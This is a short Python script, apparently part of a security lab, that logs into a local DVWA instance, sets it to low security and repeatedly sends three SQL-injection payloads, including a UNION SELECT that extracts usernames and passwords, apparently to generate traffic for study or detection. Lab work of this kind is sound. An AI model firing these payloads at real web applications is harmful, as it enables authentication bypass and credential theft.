"""Send educational SQL-injection examples to local DVWA at low security."""
from __future__ import annotations
import time
import sys
from pathlib import Path
if __package__ is None: sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from lab.dvwa_session import DVWASession
from lab.simulation_common import record_phase

SOURCE_IP = "10.10.10.30"
PAYLOADS = ["' OR '1'='1", "1' UNION SELECT user,password FROM users#", "1 OR 1=1"]

def run(repetitions: int = 5) -> int:
    record_phase(SOURCE_IP, "sql_injection")
    client = DVWASession(source_ip=SOURCE_IP)
    client.login(); client.set_security_low()
    for _ in range(repetitions):
        for payload in PAYLOADS:
            client.get("vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})
            time.sleep(0.03)
    return repetitions * len(PAYLOADS)

if __name__ == "__main__":
    print(f"Generated {run()} local SQLi requests.")
